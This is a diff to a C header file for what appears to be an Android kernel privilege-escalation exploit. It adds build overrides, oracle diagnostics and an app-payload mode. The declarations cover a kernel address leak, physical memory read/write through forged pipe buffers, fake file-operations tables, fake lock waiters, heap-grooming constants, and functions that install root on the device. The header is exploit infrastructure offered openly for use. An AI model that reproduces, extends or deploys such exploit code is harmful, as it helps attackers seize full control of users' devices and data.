@@ -41,8 +41,12 @@
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
+#ifndef SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
+#endif
+#ifndef FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
+#endif
 #else
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
@@ -61,15 +65,29 @@
 #ifndef MM_ORDER
 #define MM_ORDER 3
 #endif
+#ifndef KERNELSNITCH_VERBOSE
+#define KERNELSNITCH_VERBOSE 0
+#endif
+#ifndef KERNELSNITCH_MTE_ENABLED
+#define KERNELSNITCH_MTE_ENABLED 0
+#endif
 #define MM_PARTIALS 5
 #define CORE 0
+#ifndef KSNITCH_COLLISIONS
 #define KSNITCH_COLLISIONS 4
+#endif
 
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define PIPE_CANDIDATE_PAGES 8
+#ifndef SKB_SEND_SIZE
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
+#endif
+#ifndef SKB_RECLAIM_SENDS
 #define SKB_RECLAIM_SENDS 4
+#endif
+#ifndef APP_SLIDE_RECLAIM_SENDS
 #define APP_SLIDE_RECLAIM_SENDS 16
+#endif
 #define FOPS_TABLE_OFF FOPS_OFF
 #define SKB_FRAG_BIAS 0
 
@@ -107,24 +125,16 @@
 #define PIPE_SCAN_CHUNK 0x400
 #define PIPE_OBJS_PER_SLAB 16
 #define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
-#define PIPE_MIN_PARTIAL 5
-#define PIPE_CPU_PARTIAL 2
 #define PIPE_DRAIN_SLABS 15
 #define PIPE_RECLAIM_SLABS 15
-#define PIPE_PARTIAL_GROUPS \
-  ((PIPE_MIN_PARTIAL + PIPE_CPU_PARTIAL - 1) / PIPE_CPU_PARTIAL)
-#define PIPE_N_SLABS (PIPE_PARTIAL_GROUPS * PIPE_CPU_PARTIAL)
-#define PIPE_C_SLABS PIPE_CPU_PARTIAL
-#define PIPE_E_SLABS 2
-#define PIPE_N_COUNT (PIPE_N_SLABS * PIPE_OBJS_PER_SLAB)
-#define PIPE_C_COUNT (PIPE_C_SLABS * PIPE_OBJS_PER_SLAB)
-#define PIPE_E_COUNT (PIPE_E_SLABS * PIPE_OBJS_PER_SLAB)
 #define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
+#ifndef PIPE_MAX_ATTEMPTS
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define PIPE_MAX_ATTEMPTS 1
 #else
 #define PIPE_MAX_ATTEMPTS 12
+#endif
 #endif
 
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
@@ -221,6 +231,7 @@ extern uintptr_t fake_left;
 extern uintptr_t fake_fops;
 extern uintptr_t binwrite_target;
 
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 extern uint32_t f_wait;
 extern uint32_t f_pi_target;
 extern uint32_t f_pi_chain;
@@ -235,6 +246,7 @@ extern atomic_int punch_consume_stop;
 extern atomic_int consumer_calls;
 extern atomic_int consumer_success;
 extern atomic_int main_route_delay_usec;
+#endif
 extern atomic_int cfi_stage_done;
 extern atomic_int pipe_prepare_request;
 extern atomic_int pipe_prepare_done;
@@ -283,6 +295,9 @@ extern uint32_t pipe_probe_len;
 extern uint32_t pipe_probe_flags;
 extern uint64_t pipe_scan_first_page;
 extern uint64_t pipe_scan_first_ops;
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+extern int p0_virtual_base_probe;
+#endif
 extern uint64_t pipe_scan_q0;
 extern uint64_t pipe_scan_q1;
 extern uint64_t pipe_scan_q2;
@@ -306,6 +321,11 @@ extern uintptr_t slide_oracle_parent;
 extern uintptr_t slide_oracle_target;
 extern uintptr_t p0_gate_page_struct;
 extern uintptr_t p0_probe_page_struct;
+extern uintptr_t fops_data_probe_addr;
+extern int fops_data_probe_active;
+extern int data_alias_uses_slide;
+extern int data_addr_canonical;
+extern int slide_p0_session_fresh;
 extern int memfd_leak;
 
 int run_exploit(int argc, char **argv);
@@ -323,6 +343,7 @@ int open_ashmem_device(void);
 uintptr_t p0_data_alias(uintptr_t image_addr);
 uintptr_t p0_alias_image_offset(uintptr_t data_alias);
 uintptr_t data_addr(uintptr_t image_addr);
+uintptr_t data_direct_addr(uintptr_t image_addr);
 uintptr_t kaslr_image_addr(uintptr_t image_addr);
 uintptr_t text_addr(uintptr_t image_addr);
 uintptr_t slide_canon_addr(uintptr_t data_alias);
@@ -352,20 +373,37 @@ int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
 
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
+    !defined(SLIDE_STACK_WRITER)
 void fdset_put_word(fd_set *set, int word, uint64_t value);
+#endif
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
+#endif
 
 int slide_leak_kernel_base(void);
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
+int slide_sigreturn_preflight(void);
+#endif
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 void app_publish_p0_offset(uintptr_t offset);
+void app_publish_slide_ready(void);
 void app_publish_p0_dirty(void);
+void app_publish_writer_started(void);
 int select_slide_payload_slot(uintptr_t offset);
 int select_slide_payload_index(size_t index);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 int app_trigger_fops_slide_route(void);
+#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
+    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
+     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
+int app_trigger_fops_oracle_slot(size_t slot);
+#endif
 #endif
 #endif
 
@@ -382,13 +420,21 @@ int restore_slide_boot_id(int fd);
 int install_child_root(int fd);
 int try_cfi_stage(void);
 
+
+
+void put_fake_waiter(unsigned char *payload, size_t waiter_off,
+                     uintptr_t tree_parent, uintptr_t tree_right,
+                     uintptr_t tree_left, uintptr_t pi_parent,
+                     uintptr_t pi_right, uintptr_t pi_left,
+                     uintptr_t task, uintptr_t lock,
+                     uint32_t priority);
+
+
 void init_ctx(struct mm_ctx *ctx, size_t cnt);
 void resize_pipe_slots(int pipefd[2], size_t slots);
 void make_pipe_object(int pipefd[2]);
 void alloc_pipe_object(int pipefd[2]);
 void free_pipe_object(int pipefd[2]);
-void shape_pipe_cache_once(void);
-void shape_pipe_cache(void);
 uintptr_t prepare_pipe_buffer_page_child(void);
 uintptr_t prepare_pipe_buffer_page(void);
 void reset_pipe_attempt(void);
@@ -406,21 +452,27 @@ int pipe_phys_read(
 int pipe_phys_write(
     int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
     const void *data, size_t len);
+#if !defined(APP_EXACT_PIPE_BUFFER_ONLY) || !APP_EXACT_PIPE_BUFFER_ONLY
 void forge_pipe_buffers_on_page(
     int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write);
+#endif
 int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
 int pipe_phys_write_data(
     int fd, uintptr_t direct_addr, const void *data, size_t len);
-uint64_t pipe_read64(int fd, uintptr_t direct_addr);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
 int install_pipe_physrw(int fd);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
 int verify_p0_pipe_oracle_gate(void);
+int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
 uintptr_t scan_p0_pipe_oracle(void);
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+uint64_t scan_p0_virtual_base_pointer(void);
+#endif
 int restore_p0_oracle_pages(int fd);
 int run_p0_pipe_oracle_diagnostic(int fd);
+void start_p0_ref_keeper(void);
 #endif
 
 int install_android_root(int fd);
